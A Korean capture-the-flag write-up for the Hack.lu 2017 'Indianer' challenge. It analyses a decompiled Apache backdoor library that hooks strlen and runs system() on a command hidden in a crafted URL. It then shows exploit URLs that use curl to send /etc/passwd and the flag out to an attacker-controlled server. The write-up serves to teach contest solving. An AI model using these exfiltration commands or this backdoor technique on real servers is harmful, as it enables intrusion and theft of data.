# [Crypto] Hacklu 2017 - Indianer

# Description

Try to enter this [Tipi](https://indianer.flatearth.fluxfingers.net/)
[Download](https://flatearth.fluxfingers.net/static/indianer-f7d59dea1f5314f2ddd2d9bd401a996c.zip)

# Analysis

페이지에 들어가면 웹 서버 /에서 리스팅이 되는데, 파일은 index.html을 가지고있다.

index.html은 ubuntu에서 apache를 설치할 때 생성되는 디폴트 페이지이다.

이제 다운받은 파일 `backdoor.so`을 확인해보자.

```c
int __cdecl _libc_start_main(int (__cdecl *main)(int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void *stack_end)
{
  char **v7; // ST28_8
  void (*v8)(void); // ST20_8
  void (*v9)(void); // ST18_8
  void (*v10)(void); // ST10_8
  __int64 (__fastcall *v11)(int (__cdecl *)(int, char **, char **), _QWORD, char **, void (*)(void), void (*)(void), void (*)(void), void *); // ST48_8

  v7 = ubp_av;
  v8 = init;
  v9 = fini;
  v10 = rtld_fini;
  puts("Backdoor installed!");
  v11 = (__int64 (__fastcall *)(int (__cdecl *)(int, char **, char **), _QWORD, char **, void (*)(void), void (*)(void), void (*)(void), void *))dlsym((void *)0xFFFFFFFFFFFFFFFFLL, "__libc_start_main");
  return v11(main, (unsigned int)argc, v7, v8, v9, v10, stack_end);
}
```

\_libc\_start\_main에는 Backdoor installed!라는 문자열을 출력하는 것 뿐이다.

함수 리스트 중 strlen의 소스를 보니 딱봐도 백도어 부분이었다.

```c
__int64 __fastcall strlen(const char *a1)
{
  size_t v1; // rsi
  __int64 result; // rax
  char *v3; // rax
  signed int i; // [rsp+1Ch] [rbp-134h]
  __int64 (__fastcall *v5)(const char *, const char *); // [rsp+20h] [rbp-130h]
  char *v6; // [rsp+28h] [rbp-128h]
  char *v7; // [rsp+30h] [rbp-120h]
  char *s; // [rsp+38h] [rbp-118h]
  char *sa; // [rsp+38h] [rbp-118h]
  char needle[256]; // [rsp+40h] [rbp-110h]
  char v11; // [rsp+140h] [rbp-10h]
  unsigned __int64 v12; // [rsp+148h] [rbp-8h]

  v12 = __readfsqword(0x28u);
  v5 = (__int64 (__fastcall *)(const char *, const char *))dlsym((void *)0xFFFFFFFFFFFFFFFFLL, "strlen");
  if ( !strcmp("GET", a1) )
    ++trigger;
  v1 = (size_t)"ndex.html";
  v7 = strstr(a1, "ndex.html");
  if ( v7 && apr_hook_debug_enabled )
  {
    apr_hook_debug_enabled >>= 8;
    *(v7 - 1) += apr_hook_debug_enabled;
    apr_hook_debug_enabled = 0;
    counter = 0;
    result = v5(a1, "ndex.html");
  }
  else
  {
    memset(needle, 0, sizeof(needle));
    v11 = 0;
    for ( i = 0; i <= 511; i += 9 )
    {
      v1 = (unsigned int)(((_ & 1) + i) % 24 + 97);
      needle[i % 35] = ((_ & 1) + i) % 24 + 97;
    }
    needle[_] = 0;
    if ( trigger & 1 )
    {
      ++_;
      if ( counter <= 1 )
        ++counter;
      if ( _ > 1u )
      {
        v1 = v5(a1, (const char *)v1);
        s = (char *)memmem(a1, v1, needle, 0x22uLL);
        if ( s )
        {
          *s = 0;
          v3 = &s[strlen(needle)];
          sa = v3 + 1;
          if ( *v3 == 61 )
          {
            while ( 1 )
            {
              v1 = 95LL;
              v6 = strchr(sa, 95);
              if ( !v6 )
                break;
              *v6 = 32;
            }
            apr_hook_debug_enabled = system(sa);
          }
        }
      }
    }
    if ( counter > 1 )
      counter = 0;
    result = v5(a1, (const char *)v1);
  }
  return result;
}
```



/뒤에 ndex.html가 들어있으면 안되고  `s = (char *)memmem(a1, v1, needle, 0x22uLL);`의 결과가 1 이상이면 특정 조건에 맞춰 `system(sa);`를 실행해준다. 

needle은 /뒤에 들어가는 값으로써, 백도어에서 needle의 값은 아래의 코드를 통해 계산이 된다.

```C
for ( i = 0; i <= 511; i += 9 )
{
  v1 = (unsigned int)(((_ & 1) + i) % 24 + 97);
  needle[i % 35] = ((_ & 1) + i) % 24 + 97;
}
```

이를 python으로 옮겨 needle의 값을 구해보자.

```Python
_ = 0x6E
needle = [0 for i in range(35)]
for i in range(0,512,9):
  needle[i%35]=chr(((_ & 1)+i)%24+97)

print ''.join(needle)
```

위 코드를 실행하면 파라미터의 값 `dpdpdpamamamamajvjvjvjvgsgsgsgsgpdp`가 나온다.

또한 needle뒤에 =가 들어있으며 그 뒤에는 system()함수에 쓰실 커맨드가 들어가게된다.

주의할 것은 아래의 소스 부분이다.

```c
while ( 1 )
{
  v1 = 95LL;
  v6 = strchr(sa, 95);
  if ( !v6 )
    break;
  *v6 = 32;
}
```

sa의 값이 _가 들어있으면 이를 space로 취급한다.

이렇게 완벽된 공격 백터는 다음과 같다. `https://indianer.flatearth.fluxfingers.net/dpdpdpamamamamajvjvjvjvgsgsgsgsgpdp=(시스템 명령어)`

이제 공격을 시작해보자.

# Exploit

## Command Injection

우선 system()명령어를 수행하더라고 결과를 출력해주지는 않기 때문에 중간에 받을 서버가 필요하다.

이를 통해 /etc/passwd를 긁어와보자.

```
# url
https://indianer.flatearth.fluxfingers.net/dpdpdpamamamamajvjvjvjvgsgsgsgsgpdp=curl_http://SERVER/$(cat_/etc/passwd)
# Result
Listening on [0.0.0.0] (family 0, port 10101)
Connection from [149.13.33.84] port 10101 [tcp/*] accepted (family 2, sport 52990)
GET /root:x:0:0:root:/root:/bin/bash HTTP/1.1
Host: SERVER:10101
User-Agent: curl/7.55.1
Accept: */*
```

오 긁어와진다.

이를 통해 플래그를 찾기 위해 디렉토리를 열심히 찾던 중 발견하였다.

```
# url
https://indianer.flatearth.fluxfingers.net/dpdpdpamamamamajvjvjvjvgsgsgsgsgpdp=curl_http://SERVER/$(cat_/*/*/flag*)
# Result
Listening on [0.0.0.0] (family 0, port 10101)
Connection from [149.13.33.84] port 10101 [tcp/*] accepted (family 2, sport 52992)
GET /FLAGf4ncy_S3CR3T_ex1t HTTP/1.1
Host: SERVER:10101
User-Agent: curl/7.55.1
Accept: */*
```

플래그를 얻었다!



**FLAG{f4ncy_S3CR3T_ex1t}**

